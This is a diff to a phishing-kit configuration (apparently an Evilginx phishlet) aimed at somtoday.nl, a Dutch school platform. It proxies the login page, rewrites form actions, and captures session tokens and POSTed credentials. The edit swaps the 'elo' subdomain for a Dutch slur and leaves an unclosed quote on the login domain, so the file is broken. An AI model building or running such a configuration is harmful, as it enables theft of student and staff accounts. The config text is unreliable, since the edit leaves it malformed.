@@ -1,14 +1,14 @@
 author: '@Jerp'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'elo', orig_sub: 'elo', domain: 'somtoday.nl', session: true, is_landing: true}
+  - {phish_sub: 'elo', orig_sub: 'kanker', domain: 'somtoday.nl', session: true, is_landing: true}
 
 sub_filters:
-  - {triggers_on: 'somtoday.nl', orig_sub: 'elo', domain: 'somtoday.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'somtoday.nl', orig_sub: 'kanker', domain: 'somtoday.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
 
 auth_tokens:
-  - domain: 'elo.somtoday.nl'
-    keys: ['idtoken', 'ssonot','JSESSIONID']
+  - domain: 'kanker.somtoday.nl'
+    keys: ['idtoken','ssonot','JSESSIONID']
 
 auth_urls:
   - '/home/'
@@ -26,5 +26,5 @@ credentials:
     type: 'post'
 
 login:
-  domain: 'elo.somtoday.nl'
+  domain: 'kanker.somtoday.nl
   path: '/login'
